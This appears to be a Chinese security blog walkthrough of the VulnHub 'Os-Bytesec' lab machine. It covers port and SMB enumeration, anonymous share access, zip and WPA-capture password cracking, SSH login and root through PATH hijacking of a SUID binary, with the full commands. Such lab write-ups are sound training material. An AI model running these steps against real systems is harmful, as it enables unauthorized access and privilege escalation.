> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0SPqbIkWNSVzgXzEb8VgEA)

**免责声明**

由于传播、利用本公众号狐狸说安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号狐狸说安全及作者不为**此**承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！

### 0x01 靶机介绍

*   Difficulty : Intermediate
    
*   Flag : 2 Flag first user And second root
    
*   Learning : exploit | SMB | Enumration | Stenography | Privilege Escalation
    
*   Contact : https://www.linkedin.com/in/rahulgehlaut
    

靶机下载地址：

```
https://www.vulnhub.com/entry/hacknos-os-bytesec,393/

```

### 0x02 侦察

**端口探测**

首先使用 nmap 进行端口扫描

```
nmap -p- -sV -sC -A 192.168.0.105 -oA namp_Os-Bytesec

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxKb4KPtQ7ic0x2ibXTQs2rFBprRmYiaABNicWoibsah5582JYOa7bMHpMzmw/640?wx_fmt=png)

扫描结果显示目标开放了 2525、139、445、和 80 端口

80 端口

访问 http://192.168.0.105 界面如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxwNefs2fqpvhp53cXUpibUy1q3Z4NKpxpsicgtfQ20pVSzVvr1wkKDm3g/640?wx_fmt=png)

**目录扫描**

使用 gobuster 进行目录扫描，但未发现敏感目录

```
gobuster dir -u http://192.168.0.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOux3v1xu2X92rRvvM3MkZSibos5S8rJwSibUjkHmAUdibwqHIopUxdWnRAibA/640?wx_fmt=png)

### 0x03 上线【blackjax】

信息收集

使用 nmap 扫描 SMB 服务漏洞，除了 Dos 攻击外未发现其他漏洞

```
nmap -v -p 139,445 --script=smb-vuln-*.nse
--script-args=unsafe=1 192.168.0.105

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxGIkGVTuqr0MUWDL4EZfUy48AqSXxf0SWFibxn0GCGKkOLf3mMnTtcaw/640?wx_fmt=png)

使用 smbmap 列出共享，均无进入权限

```
smbmap -H 192.168.0.105

```

使用 enum4linux 测试 SMB 服务，成功发现 smb 用户且无需密码

```
enum4linux -U 192.168.0.105

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxha70zYjDNOtPg8UKmAI1kk5icuR4m4kQCBZCdQCyQEULhWzPA2FkqEg/640?wx_fmt=png)

再次扫描枚举用户、共享文件，成功找到其他两个用户 sagar、blackjax

```
enum4linux 192.168.0.105

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxaefEZK0GlriawMdSIBu17pC6s1pO57HtDEXRuicXUnqyvU5qeYLJ5WVg/640?wx_fmt=png)

**SMB 枚举**

使用 smbmap 分别列出用户共享目录

```
smbmap -H 192.168.0.105 -u smb

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOux0e5FbDS3YGqPUcz0icUbn8Kc08UcPj3PgQCZHbE5OLzjfdmNpp2jk2A/640?wx_fmt=png)

其中 smb 用户具有可读权限，查看文件列表

```
smbmap -H 192.168.0.105 -u smb -R

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxOPyGR4ia9fibsjByWpNicOAqiavGocibTAwjtEX3wGPhJEawe4ekUq8lMNw/640?wx_fmt=png)

使用 smbclient 登录 smb 用户，密码为空

```
smbclient //192.168.0.105/smb -U smb

```

查看并下载其中存在的文件

```
smb > ls
smb > get main.txt
smb > get safe.zip

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxtgGBNpibuuqBtKWhfTu7J5cBeGPsfadFcnBxalqOeomYDicPdP3uBT4g/640?wx_fmt=png)

**ZIP 密码破解**

压缩包 safe.zip 解压需要密码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxC6AY90ibbwvPWyrQNw3aovmHvm1zNoBrfB5LicuH3QRE3vwxq2XqxUibA/640?wx_fmt=png)

使用 fcrackzip 破解压缩包密码，成功拿到密码 hacker1

```
gzip -dk /usr/share/wordlists/rockyou.txt.gz 
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u safe.zip

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxhHDy9gIzM9ibqPenCcZF8ymfq55Ua314icicOLJPLy38kYmkkt2jZaibQg/640?wx_fmt=png)

通过该密码解压压缩包，解压成功为 secret.jpg、user.cap，其中 secret.jpg 为一张图片，user.cap 存在包信息

```
unzip safe.zip

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxEIJPFJtCicv25ILiafVcwWClN2v07oJ5iaOR8cpDK9oZUj27HrcVw7UoQ/640?wx_fmt=png)

使用 aircrack-ng 爆破 user.cap，成功拿到帐号密码 blackjax/snowflake

```
aircrack-ng -w /usr/share/wordlists/rockyou.txt user.cap

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOux3Pn0QPpINJt7mHf7NEY5zNorkQWLuFh8AcY8hpxovwRwQqASX2CUog/640?wx_fmt=png)

### **SSH 登录**

成功登录目标 SSH 服务

```
ssh -p 2525 blackjax@192.168.0.105

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxjdUfes4ZZlnA7KibkzEeYfj3BY4UEbLAicoEMDqBnrNVkVOCkNWD5PBQ/640?wx_fmt=png)

在家目录下成功拿到第一个 flag

```
cat user.txt

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxbVqjQjZ751DicWx4eB6ye7vRxGxicchxffSKJV1k9dpKZiaPBd1gxBGBA/640?wx_fmt=png)

### 0x04 权限提升

信息收集

通过 find 命令查找带有 suid 的文件，成功找到 netscan

```
find / -type f -perm -u=s 2>/dev/null

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxrKP8laIt2TTcjq5CSy3QwIFtMYkJBRicFoy8J7DyGyN4ibolCV5mQTZA/640?wx_fmt=png)

运行 netscan 结果与 netstat -ntlp 命令类似，可能调用 netstat 命令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxIGshXTAbQMzHXIK0VJEErEuzoYv41LjibCI8mmFRvLdh3LvKZqvE3Nw/640?wx_fmt=png)

通过 xxd 查看命令，其中确实调用了 netstat 命令

```
xxd /usr/bin/netscan | less

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOux3hic6ibOxB6QK6Fo8JzIqdLpGbCuiaXIukY5566scbnCWlnEWVJlIbnlQ/640?wx_fmt=png)

**路径劫持**

进入 / tmp 设置新环境变量

```
cd /tmp
#查看当前环境变量
echo $PATH
#添加环境变量
export PATH=/tmp:$PATH

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxYQCic67fuCzZPg8H4haTekSt0TUb7kAoab56w8Oa634ZYIhBQIOsqZg/640?wx_fmt=png)

修改 netscan 程序为 / bin/sh，同时赋予执行权限

```
echo "/bin/sh" > netstat
chmod 755 netstat

```

一旦执行 netscan 成功拿到 root 权限

```
netstat

```

在管理员家目录成功拿到第二个 flag

```
cat /root/root.txt

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxajhRY5OWhryM93yDZTZTONicWWJe2MdEchVCrwyBzVibOEmYOZGJcicnQ/640?wx_fmt=png)

### 0x05 知识星球

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/pH5fZ5lvwwb5Z3voQE0l6qmmFmYILOuxgP8w5nibfffL3j187qJx5ibJQO22QziaJXWtiaWcS3nLTic26UJ83IBUib0g/640?wx_fmt=jpeg)